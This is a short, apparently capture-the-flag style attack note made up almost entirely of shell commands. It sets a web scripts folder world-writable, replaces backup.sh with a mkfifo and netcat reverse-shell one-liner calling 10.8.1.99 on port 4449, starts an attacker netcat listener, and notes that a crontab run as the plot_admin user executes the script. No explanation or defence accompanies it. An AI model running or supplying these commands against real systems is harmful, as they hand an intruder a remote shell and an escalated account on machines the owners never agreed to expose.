```
chmod 777 /var/www/scripts
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.1.99 4449 >/tmp/f" > /var/www/scripts/backup.sh

attacker: nc -lvnp 4449

* Crontab execute with plot_admin user*
```